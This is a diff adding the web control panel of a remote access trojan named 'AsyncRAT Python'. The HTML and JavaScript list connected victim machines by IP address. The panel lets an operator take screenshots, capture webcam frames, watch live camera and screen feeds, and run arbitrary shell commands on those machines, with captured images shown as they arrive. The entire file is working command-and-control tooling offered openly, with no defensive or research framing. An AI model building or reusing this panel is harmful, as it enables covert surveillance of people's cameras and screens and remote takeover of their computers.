@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AsyncRAT Python Web</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&family=Inter:wght@400;600&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>AsyncRAT <span class="badge">Python</span></h1>
+            <div class="status">Server: <span class="online">Online</span></div>
+        </header>
+
+        <main>
+            <div class="panel clients-panel">
+                <h2>Connected Clients</h2>
+                <div class="table-wrapper">
+                    <table id="clients-table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>IP Address</th>
+                                <th>Last Seen</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- Populated by JS -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="panel console-panel hidden" id="console-panel">
+                <div class="console-header">
+                    <h2 id="console-title">Console</h2>
+                    <button class="close-btn" onclick="closeConsole()">×</button>
+                </div>
+                <div class="console-output" id="console-output">
+                    <!-- Logs go here -->
+                </div>
+                <div class="console-input-area">
+                    <select id="cmd-select" onchange="toggleCustomInput()">
+                        <option value="" disabled selected>Select Action...</option>
+                        <option value="info">Get System Info</option>
+                        <option value="screenshot">Take Screenshot</option>
+                        <option value="camera">Capture Camera Frame</option>
+                        <option value="stream start">Start Live Stream</option>
+                        <option value="stream stop">Stop Live Stream</option>
+                        <option value="monitor start">Start Screen Share</option>
+                        <option value="monitor stop">Stop Screen Share</option>
+                        <option value="shell whoami">Check User (whoami)</option>
+                        <option value="shell ipconfig">Check Network (ipconfig)</option>
+                        <option value="shell dir">List Files (dir)</option>
+                        <option value="shell systeminfo">Full System Specs</option>
+                        <option value="custom">Custom Shell Command...</option>
+                    </select>
+                    <input type="text" id="command-input" placeholder="Type command here..." class="hidden">
+                    <button onclick="handleSend()">Execute</button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        let currentClientId = null;
+        let pollInterval = null;
+        let streamInterval = null;
+        let screenInterval = null;
+
+        function formatTime(timestamp) {
+            const date = new Date(timestamp * 1000);
+            return date.toLocaleTimeString();
+        }
+
+        function toggleCustomInput() {
+            const select = document.getElementById('cmd-select');
+            const input = document.getElementById('command-input');
+            if (select.value === 'custom') {
+                input.classList.remove('hidden');
+                input.focus();
+            } else {
+                input.classList.add('hidden');
+            }
+        }
+
+        async function fetchClients() {
+            try {
+                const res = await fetch('/api/clients');
+                const data = await res.json();
+                const tbody = document.querySelector('#clients-table tbody');
+                tbody.innerHTML = '';
+
+                if (data.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" class="no-data">No clients connected.</td></tr>';
+                    return;
+                }
+
+                data.forEach(client => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><span class="client-id" title="${client.id}">${client.id.substring(0, 8)}...</span></td>
+                        <td>${client.ip}</td>
+                        <td>${formatTime(client.last_seen)}</td>
+                        <td>
+                            <button class="btn-control" onclick="openConsole('${client.id}', '${client.ip}')">Control</button>
+                            <button class="btn-warn" style="margin-left:5px;" onclick="watchStream('${client.id}', '${client.ip}')">Watch Feed</button>
+                            <button class="btn-warn" style="margin-left:5px; background: #007bff;" onclick="watchScreen('${client.id}', '${client.ip}')">Watch Screen</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error("Failed to fetch clients", e);
+            }
+        }
+
+        function openConsole(id, ip) {
+            currentClientId = id;
+            document.getElementById('console-panel').classList.remove('hidden');
+            document.getElementById('console-title').innerText = `Console: ${ip}`;
+            // Don't clear output if we are just switching views, but here we reset for cleanliness
+            // document.getElementById('console-output').innerHTML = '<div class="sys-msg">Console ready. Select an action...</div>';
+
+            if (pollInterval) clearInterval(pollInterval);
+            pollInterval = setInterval(fetchResponses, 2000);
+        }
+
+        function watchStream(id, ip) {
+            openConsole(id, ip);
+            startStreamView(id);
+        }
+
+        function watchScreen(id, ip) {
+            openConsole(id, ip);
+            startScreenView(id);
+        }
+
+        function closeConsole() {
+            stopStreamView(); // safety
+            stopScreenView(); // safety
+            currentClientId = null;
+            document.getElementById('console-panel').classList.add('hidden');
+            if (pollInterval) clearInterval(pollInterval);
+        }
+
+        function handleSend() {
+            const select = document.getElementById('cmd-select');
+            const input = document.getElementById('command-input');
+            let cmd = select.value;
+
+            if (cmd === 'custom') {
+                cmd = input.value.trim();
+                // Basic validation for custom shell
+                if (!cmd.startsWith('shell ') && !['info', 'screenshot', 'camera'].includes(cmd)) {
+                    // Assume shell if they just typed 'dir'
+                    cmd = 'shell ' + cmd;
+                }
+            }
+
+            if (cmd && cmd !== 'custom') {
+                sendCommand(cmd);
+                if (select.value === 'custom') input.value = '';
+            }
+        }
+
+        async function sendCommand(cmd) {
+            if (!currentClientId) return;
+
+            // Optimistic update
+            const output = document.getElementById('console-output');
+            output.innerHTML += `<div class="cmd-msg">> ${cmd}</div>`;
+            output.scrollTop = output.scrollHeight;
+
+            try {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: currentClientId, command: cmd })
+                });
+            } catch (e) {
+                output.innerHTML += `<div class="err-msg">Error sending command</div>`;
+            }
+        }
+
+        document.getElementById('command-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') handleSend();
+        });
+
+        async function fetchResponses() {
+            if (!currentClientId) return;
+            try {
+                const res = await fetch(`/api/responses/${currentClientId}`);
+                const msgs = await res.json();
+                const output = document.getElementById('console-output');
+
+                msgs.forEach(msg => {
+                    if (msg.output) {
+                        output.innerHTML += `<div class="res-msg">${escapeHtml(msg.output)}</div>`;
+
+                        if (msg.output.includes("Stream started") || msg.output.includes("Stream already running")) {
+                            startStreamView(currentClientId);
+                        }
+                        if (msg.output.includes("Stream stopped")) {
+                            stopStreamView();
+                        }
+                        if (msg.output.includes("Screen Monitor started") || msg.output.includes("Screen Monitor already running")) {
+                            startScreenView(currentClientId);
+                        }
+                        if (msg.output.includes("Screen Monitor stopped")) {
+                            stopScreenView();
+                        }
+                    }
+                    if (msg.error) {
+                        output.innerHTML += `<div class="err-msg">${escapeHtml(msg.error)}</div>`;
+                    }
+                    if (msg.image_url) {
+                        output.innerHTML += `<div class="res-msg">
+                            <a href="${msg.image_url}" target="_blank">
+                                <img src="${msg.image_url}" style="max-width: 100%; max-height: 300px; border: 1px solid #444; border-radius: 4px; margin-top: 5px;" alt="Capture">
+                            </a>
+                            <br><small style="color:#888;">Click to expand</small>
+                        </div>`;
+                    }
+                });
+                if (msgs.length > 0) output.scrollTop = output.scrollHeight;
+            } catch (e) {
+                console.error("Polling error", e);
+            }
+        }
+
+        function startStreamView(clientId) {
+            stopStreamView(); // Clear any existing
+
+            const output = document.getElementById('console-output');
+            const streamDiv = document.createElement('div');
+            streamDiv.id = 'stream-container';
+            streamDiv.className = 'res-msg';
+            streamDiv.innerHTML = `
+                <div style="background: #222; padding: 10px; text-align: center; border: 1px solid #00ff00; border-radius: 5px; margin: 10px 0;">
+                    <div style="color: #00ff00; font-weight: bold; margin-bottom: 5px;">🔴 LIVE CAMERA FEED</div>
+                    <div id="feed-status" style="color: #888; font-size: 0.8em;">Connecting...</div>
+                    <img id="live-stream-img" src="" 
+                        style="max-width: 100%; max-height: 400px; border: 1px solid #444; margin-top: 5px; display: none;"
+                        onload="this.style.display='inline-block'; document.getElementById('feed-status').innerText='Receiving Data';"
+                        onerror="this.style.display='none'; document.getElementById('feed-status').innerText='Waiting for signal...';"
+                    >
+                </div>
+            `;
+            // Insert at the top of output or bottom? Bottom is standard for logs.
+            output.appendChild(streamDiv);
+            output.scrollTop = output.scrollHeight;
+
+            const img = document.getElementById('live-stream-img');
+            const urlBase = `/static/captures/stream_${clientId}.jpg`;
+
+            // Refresh image rapidly
+            streamInterval = setInterval(() => {
+                img.src = `${urlBase}?t=${new Date().getTime()}`;
+            }, 300); // 3-4 FPS refresh on client side to reduce flicker/load
+        }
+
+        function stopStreamView() {
+            if (streamInterval) clearInterval(streamInterval);
+            const el = document.getElementById('stream-container');
+            if (el) {
+                el.innerHTML = '<div style="color: #666; padding: 10px; text-align: center;">[Stream Session Ended]</div>';
+                el.id = ''; // remove id to stop updates
+            }
+        }
+
+        function startScreenView(clientId) {
+            stopScreenView(); // Clear any existing
+
+            const output = document.getElementById('console-output');
+            const screenDiv = document.createElement('div');
+            screenDiv.id = 'screen-container';
+            screenDiv.className = 'res-msg';
+            screenDiv.innerHTML = `
+                <div style="background: #222; padding: 10px; text-align: center; border: 1px solid #007bff; border-radius: 5px; margin: 10px 0;">
+                    <div style="color: #007bff; font-weight: bold; margin-bottom: 5px;">🖥️ SCREEN SHARE</div>
+                    <div id="screen-status" style="color: #888; font-size: 0.8em;">Connecting...</div>
+                    <img id="live-screen-img" src="" 
+                        style="max-width: 100%; max-height: 400px; border: 1px solid #444; margin-top: 5px; display: none;"
+                        onload="this.style.display='inline-block'; document.getElementById('screen-status').innerText='Receiving Screen';"
+                        onerror="this.style.display='none'; document.getElementById('screen-status').innerText='Waiting for signal...';"
+                    >
+                </div>
+            `;
+            output.appendChild(screenDiv);
+            output.scrollTop = output.scrollHeight;
+
+            const img = document.getElementById('live-screen-img');
+            const urlBase = `/static/captures/screen_${clientId}.jpg`;
+
+            screenInterval = setInterval(() => {
+                img.src = `${urlBase}?t=${new Date().getTime()}`;
+            }, 800); // Screen refresh slower (start at ~1.25 fps client side check)
+        }
+
+        function stopScreenView() {
+            if (screenInterval) clearInterval(screenInterval);
+            const el = document.getElementById('screen-container');
+            if (el) {
+                el.innerHTML = '<div style="color: #666; padding: 10px; text-align: center;">[Screen Session Ended]</div>';
+                el.id = '';
+            }
+        }
+
+        function escapeHtml(text) {
+            if (!text) return "";
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;")
+                .replace(/\n/g, "<br>");
+        }
+
+        // Global poll
+        setInterval(fetchClients, 2000);
+        fetchClients();
+    </script>
+</body>
+
+</html>
